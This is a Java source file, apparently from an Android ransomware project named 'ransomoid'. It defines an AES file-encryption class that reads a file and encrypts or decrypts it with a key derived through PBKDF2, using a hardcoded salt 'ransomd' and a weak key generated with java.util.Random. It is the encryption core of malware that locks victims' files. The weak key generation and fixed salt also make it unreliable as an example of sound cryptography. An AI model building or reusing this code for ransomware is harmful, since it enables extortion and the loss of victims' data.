package falezza.fabio.ransomoid.utils;

import android.util.Base64;

import java.io.File;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.KeySpec;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Created by fabio on 01/02/18.
 */

public class AesEncrypter {

    private static AesEncrypter instance;

    private File file;
    private byte[] iv;
    private byte[] key;

    private SecretKeySpec skrr;

    private AesEncrypter() {}

    public static AesEncrypter getInstance() {
        if (instance == null) {
            instance = new AesEncrypter();
        }
        return instance;
    }

    public void setKey(byte[] key) {
        this.key = key;
    }

    public void setFile(File file) {
        this.file = file;
    }

    public byte[] encrypt() throws Exception {
        FileProcessor fileProcessor = FileProcessor.getInstance();
        byte[] bytes = fileProcessor.readBytes(this.file);
        SecretKeySpec sKeySpec = new SecretKeySpec(getRawKey(Base64.encodeToString(this.key, Base64.NO_WRAP)), "AES");
        this.skrr = sKeySpec;
        Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(this.iv);
        cipher.init(Cipher.ENCRYPT_MODE, sKeySpec, ivParameterSpec);
        return cipher.doFinal(bytes);
    }

    public byte[] decrypt() throws Exception {
        FileProcessor fileProcessor = FileProcessor.getInstance();
        byte[] bytes = fileProcessor.readBytes(this.file);
        SecretKeySpec sKeySpec = new SecretKeySpec(getRawKey(Base64.encodeToString(this.key, Base64.NO_WRAP)), "AES");
        Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(this.iv);
        cipher.init(Cipher.DECRYPT_MODE, sKeySpec, ivParameterSpec);
        return cipher.doFinal(bytes);
    }

    /*
    * getRawKey does key expansion using a more secure algorithm and uses a salt to generate
    * the Key
    */
    private static byte[] getRawKey(String password) throws Exception {
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        KeySpec spec = new PBEKeySpec(password.toCharArray(), "ransomd".getBytes(), 65536, 256);
        SecretKey tmp = factory.generateSecret(spec);
        SecretKey secret = new SecretKeySpec(tmp.getEncoded(), "AES");
        return secret.getEncoded();
    }

    public byte[] getKey() {
        return key;
    }

    public void generateRandomKey() {
        try {
            SecureRandom se = SecureRandom.getInstance("SHA1PRNG");
            Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
            this.iv = new byte[cipher.getBlockSize()];
            se.nextBytes(this.iv);
            Random random = new Random();
            Long hex = random.nextLong();
            String key = Long.toHexString(hex);
            this.key = key.getBytes();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        }

    }
}
